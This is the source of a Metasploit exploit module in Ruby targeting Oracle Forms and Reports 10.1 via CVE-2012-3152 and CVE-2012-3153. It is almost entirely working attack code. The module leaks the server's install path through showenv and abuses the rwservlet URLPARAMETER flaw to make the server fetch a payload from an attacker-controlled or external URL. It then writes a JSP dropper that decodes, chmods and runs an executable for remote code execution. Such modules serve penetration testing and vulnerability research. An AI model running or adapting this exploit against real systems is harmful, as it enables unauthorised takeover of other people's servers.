##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'uri'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  Rank = GreatRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Oracle Forms and Reports Remote Code Execution',
      'Description'     => %q{
      This module uses two vulnerabilities in Oracle forms and reports to get remote code execution
      on the host. The showenv url can be used to disclose information about a server. A second
      vulnerability that allows arbitrary reading and writing to the host filesystem can then be
      used to write a shell from a remote url to a known local path disclosed from the previous
      vulnerability.

      The local path being accessable from an URL then allows us to perform the remote code
      execution using for example a .jsp shell.

      Tested on Windows and Oracle Forms and Reports 10.1.
      },
      'Author'          =>
        [
          'miss_sudo <security[at]netinfiltration.com>', # Vulnerability discovery
          'Mekanismen <mattias[at]gotroot.eu>' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ "CVE", "2012-3152" ],
          [ "CVE", "2012-3153" ],
          [ "OSVDB", "86395" ], # Matches CVE-2012-3152
          [ "OSVDB", "86394" ], # Matches CVE-2012-3153
          [ "EDB", "31253" ],
          [ 'URL', "http://netinfiltration.com" ]
        ],
      'Stance'          => Msf::Exploit::Stance::Aggressive,
      'Platform'        => ['win', 'linux'],
      'Targets'         =>
        [
          [ 'Linux',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'linux'
            }
          ],
          [ 'Windows',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'win'
            }
          ],
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Jan 15 2014'
    ))
    register_options(
      [
        OptString.new('EXTURL', [false, 'An external host to request the payload from', "" ]),
        OptString.new('PAYDIR', [true, 'The folder to download the payload to', "/images/" ]),
        OptInt.new('HTTPDELAY', [false, 'Time that the HTTP Server will wait for the payload request', 10]),
      ])
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/reports/rwservlet/showenv"),
      'method' => 'GET'
      })

    if res and res.code == 200
      if res.body =~ /\\(.*)\\showenv/
        vprint_good "#{peer} - Windows install detected "
        path = $1.gsub("\\", "/")
        vprint_status "#{peer} - Path:  #{path}"
      elsif res.body =~ /\/(.*)\/showenv/
        vprint_good "#{peer} - Linux install detected"
        vprint_status "#{peer} - Path:  #{$1}"
      else
        return Exploit::CheckCode::Safe
      end
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/reports/rwservlet"),
      'method' => 'GET',
       'vars_get' => {
       'report' => 'test.rdf',
       'desformat' => 'html',
       'destype' => 'cache',
       'JOBTYPE' => 'rwurl',
       'URLPARAMETER' => 'file:///'
       }
      })

    if res and res.code == 200 and res.body.downcase.exclude?("<html>")
      vprint_good "#{peer} - URLPARAMETER is vulnerable"
      return Exploit::CheckCode::Vulnerable
    else
      vprint_status "#{peer} - URLPARAMETER is not vulnerable"
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    @payload_url = ""
    @payload_name = rand_text_alpha(8+rand(8)) + ".jsp"
    @payload_dir = datastore['PAYDIR']
    @local_path = ""

    print_status "#{peer} - Querying showenv!"
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/reports/rwservlet/showenv"),
      'method' => 'GET',
      })

    if res and res.code == 200
      if res.body =~ /\\(.*)\\showenv/
        print_good "#{peer} - Query succeeded!"
        print_status "#{peer} - Windows install detected "
        @local_path = $1.gsub("\\", "/")
        print_status "#{peer} - Path: #{@local_path }"
      elsif res.body =~ /\/(.*)\/showenv/
        print_good "#{peer} - Query succeeded!"
        print_status "#{peer} - Linux install detected"
        @local_path = $1
        print_status "#{peer} - Path:  #{@local_path }"
      else
        print_status "#{peer} - Query failed"
        fail_with(Failure::Unknown, "#{peer} - target is not vulnerable or unreachable")
      end
    else
      fail_with(Failure::Unknown, "#{peer} - target is not vulnerable or unreachable")
    end

    if datastore['EXTURL'].blank?
      print_status "#{peer} - Hosting payload locally ..."
      begin
        Timeout.timeout(datastore['HTTPDELAY']) {super}
      rescue Timeout::Error
      end
      exec_payload
    else
      print_status "#{peer} - Using external url for payload delivery ..."
      @payload_url = datastore['EXTURL']
      upload_payload
      exec_payload
    end
  end

  def primer
    @payload_url = get_uri
    @pl = gen_file_dropper
    upload_payload
  end

  def on_request_uri(cli, request)
    send_response(cli, @pl)
  end

  def upload_payload
    print_status "#{peer} - Uploading payload ..."
    path = "/#{@local_path}#{@payload_dir}#{@payload_name}"
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/reports/rwservlet"),
      'method' => 'GET',
      'encode_params' => false,
      'vars_get' => {
        'report' => 'test.rdf',
        'desformat' => 'html',
        'destype' => 'file',
        'desname' => path,
        'JOBTYPE' => 'rwurl',
        'URLPARAMETER' => @payload_url
       }
    })

    if res and res.code == 200
      print_good "#{peer} - Payload hopefully uploaded!"
    else
      print_status "#{peer} - Payload upload failed"
    end
  end

  def gen_file_dropper
    big_payload =  false #size matters :(

    gen_payload_name  = rand_text_alpha(8+rand(8))
    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)
    print_status "#{peer} - Building JSP shell ..."

    len = encoded_pl.length
    if len >= 60000 #java string size limit ~60k workaround
      print_status "#{peer} - Adjusting shell due to payload size"
      pl_first = encoded_pl.slice(0, 60000)
      pl_second = encoded_pl.slice(60000, len)
      big_payload = true
    end

    #embed our payload
    shell  = "<%@ page import=\"java.util.*,java.io.*, sun.misc.BASE64Decoder\"%>"
    shell += " <%"
    shell += " BASE64Decoder decoder = new BASE64Decoder();"
    #correct file suffix if windows
    if datastore['TARGET'] == 1
      shell += " File temp = File.createTempFile(\"#{gen_payload_name}\", \".exe\");"
    else
      shell += " File temp = File.createTempFile(\"#{gen_payload_name}\", \".tmp\");"
    end
    shell += " String path = temp.getAbsolutePath();"
    if big_payload
      shell += " byte [] pl = decoder.decodeBuffer(\"#{pl_first}\");"
      shell += " byte [] pltwo = decoder.decodeBuffer(\"#{pl_second}\");"

      shell += " BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));"
      shell += " ou.write(pl);"
      shell += " ou.close();"

      shell += " ou = new BufferedOutputStream(new FileOutputStream(path, true));"
      shell += " ou.write(pltwo);"
      shell += " ou.close();"
    else
      shell += " byte [] pl = decoder.decodeBuffer(\"#{encoded_pl}\");"
      shell += " BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));"
      shell += " ou.write(pl);"
      shell += " ou.close();"
    end
    #correct rights if linux host
    if datastore['TARGET'] == 0
      shell += " Process p = Runtime.getRuntime().exec(\"/bin/chmod 700 \" + path);"
      shell += " p.waitFor();"
    end
    shell += " Runtime.getRuntime().exec(path);"
    shell += "%>"

    return shell
  end

  def exec_payload
    print_status("#{peer} - Our payload is at: /reports#{@payload_dir}#{@payload_name}")
    print_status("#{peer} - Executing payload...")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "reports", @payload_dir, @payload_name),
      'method' => 'GET'
    })

    if res and res.code == 200
       print_good("#{peer} - Payload executed!")
    else
       print_status("#{peer} - Payload execution failed")
    end
  end
end
